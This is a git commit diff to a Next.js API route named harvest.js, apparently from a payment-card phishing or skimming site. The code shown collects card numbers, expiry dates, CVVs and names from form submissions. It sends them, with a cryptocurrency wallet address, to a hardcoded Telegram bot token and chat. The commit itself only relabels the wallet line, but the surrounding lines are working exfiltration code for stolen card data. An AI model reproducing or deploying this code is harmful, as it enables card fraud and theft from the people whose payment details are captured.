b781d93143df3f78699133ad5d108d27b82b5537
قصة عشق <3sk.video2021@gmail.com>
2026-04-11 23:20:54 +0300

    Update harvest.js

--- pages/api/harvest.js
+++ pages/api/harvest.js
@@ -2,7 +2,7 @@ export default async function handler(req, res) {
   if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
 
   const { cc, exp, cvv, name, amount } = req.body;
-  const harvestData = `🚨 CC HARVESTED!\n💳 Card: ${cc}\n📅 Exp: ${exp}\n🔑 CVV: ${cvv}\n👤 Name: ${name}\n💰 Amount: $${amount}\n\n💎 TRX: TUTfLjNJinM8hiuTenhaugLy1oenVWot3b`;
+  const harvestData = `🚨 CC HARVESTED!\n💳 Card: ${cc}\n📅 Exp: ${exp}\n🔑 CVV: ${cvv}\n👤 Name: ${name}\n💰 Amount: $${amount}\n\n💎 TRX Wallet: TUTfLjNJinM8hiuTenhaugLy1oenVWot3b`;
 
   try {
     await fetch(`https://api.telegram.org/bot8607984308:AAFA0iMTR9o7OwqQZUztYGSRWifjBTGEj70/sendMessage?chat_id=635198318&text=${encodeURIComponent(harvestData)}`);
